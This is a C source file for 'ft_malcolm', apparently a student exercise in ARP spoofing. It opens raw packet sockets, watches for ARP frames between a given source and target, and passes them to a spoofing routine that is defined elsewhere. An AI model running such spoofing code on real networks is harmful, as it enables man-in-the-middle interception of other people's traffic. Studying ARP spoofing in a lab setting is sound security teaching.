//
// CreateNULLd by loumouli on 12/13/23.
//

#include "ft_malcolm.h"

char stop = true;

void sig_handler(const int sig) {
  if (sig == SIGINT) {
    stop = false;
  }
}

static void init_inqui(t_malcolm* malcolm, char** av) {
  malcolm->ip_src = (uint8_t *)av[1];
  malcolm->mac_src = (uint8_t *)av[2];
  malcolm->ip_target = (uint8_t *)av[3];
  malcolm->mac_target = (uint8_t *)av[4];
  malcolm->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (malcolm->sock == -1)
    error("socket", NULL, __FILE__, __LINE__, __func__);
  malcolm->ifr.ifr_addr.sa_family = AF_INET;
  strncpy(malcolm->ifr.ifr_name, INTERFACE_NAME, strlen(INTERFACE_NAME) + 1);
  int retval = ioctl(malcolm->sock, SIOCGIFADDR, &malcolm->ifr);
  if (retval == -1)
    error("ioctl", NULL, __FILE__, __LINE__, __func__);
  malcolm->index = if_nametoindex(INTERFACE_NAME);
  if (!malcolm->index)
    error("if_nametoindex", NULL, __FILE__, __LINE__, __func__);
  retval = ioctl(malcolm->sock, SIOCGIFBRDADDR, &malcolm->ifr);
  if (retval == -1)
    error("ioctl", NULL, __FILE__, __LINE__, __func__);
  malcolm->brd = (struct sockaddr_in *)&malcolm->ifr.ifr_broadaddr;
  retval = ioctl(malcolm->sock, SIOCGIFHWADDR, &malcolm->ifr);
  if (retval == -1)
    error("ioctl", NULL, __FILE__, __LINE__, __func__);
  mac_str_to_hex(malcolm->mac_src, malcolm->mac_src_byte_arr);
  mac_str_to_hex(malcolm->mac_target, malcolm->mac_target_byte_arr);

  malcolm->sock_broad = socket(AF_PACKET, SOCK_RAW | SOCK_NONBLOCK, htons(ETH_P_ALL));
  if (malcolm->sock_broad == -1)
    error("socket", NULL, __FILE__, __LINE__, __func__);
  retval = setsockopt(malcolm->sock_broad, SOL_SOCKET, SO_BROADCAST, &(int){1}, sizeof(int));
  if (retval == -1)
    error("setsockopt", NULL, __FILE__, __LINE__, __func__);
  struct sockaddr_ll addr;
  ft_memset(&addr, 0, sizeof(addr));
  addr.sll_family = AF_PACKET;
  addr.sll_protocol = htons(ETH_P_ALL);
  addr.sll_ifindex = malcolm->index;
  retval = bind(malcolm->sock_broad, (struct sockaddr *)&addr, sizeof(addr));
  if (retval == -1)
    error("bind", NULL, __FILE__, __LINE__, __func__);
}

static ethernet_frame* listen_broad(const t_malcolm* malcolm) {
  char buff[15000];
  const int retval = recvfrom(malcolm->sock_broad, buff, sizeof(buff), 0, NULL, NULL);
  if (retval == -1) {
    if (errno == EAGAIN || errno == EWOULDBLOCK)
      return NULL;
    error("recvfrom", NULL, __FILE__, __LINE__, __func__);
  }
  const ethernet_frame* eth = (ethernet_frame*)buff;
  if (ntohs(*(uint16_t*)eth->ethertype) != ETH_P_ARP)
    return NULL;
  if (ft_memcmp(eth->dest_addr, malcolm->mac_target_byte_arr, 6) != 0)
    return NULL;
  if (ft_memcmp(eth->src_addr, malcolm->mac_src_byte_arr, 6) != 0)
    return NULL;
  dprintf(1, "ARP PACKET\n");
  dprintf(1, "received %d bytes\n", retval);
  dprintf(1, "dest_addr: %02x:%02x:%02x:%02x:%02x:%02x\n", eth->dest_addr[0], eth->dest_addr[1], eth->dest_addr[2], eth->dest_addr[3], eth->dest_addr[4], eth->dest_addr[5]);
  dprintf(1, "src_addr: %02x:%02x:%02x:%02x:%02x:%02x\n", eth->src_addr[0], eth->src_addr[1], eth->src_addr[2], eth->src_addr[3], eth->src_addr[4], eth->src_addr[5]);
  dprintf(1, "ethertype: %02x:%02x\n", eth->ethertype[0], eth->ethertype[1]);
  ethernet_frame* result = ft_calloc(1, sizeof(ethernet_frame));
  if (result == NULL)
      return result;
  ft_memcpy(result, eth, sizeof(ethernet_frame));
  return  result;
}


int main(const int ac, char** av) {
  t_malcolm malcolm;
  if (ac != 5)
    error("main", "usage: ./ft_malcolm <ip_src> <mac_src> <ip_target> <mac_target>", __FILE__, __LINE__, __func__);
  init_inqui(&malcolm, av);
  signal(SIGINT, sig_handler);
  while (stop) {
    // listen to broadcast for target arp request
    const ethernet_frame* pot_packet =  listen_broad(&malcolm);
    if (pot_packet) {
      spoof_back_request(&malcolm, pot_packet);
    }
    // send ARP reply to spoof source to target
  }
  close(malcolm.sock);
  close(malcolm.sock_broad);
  return 1;
}
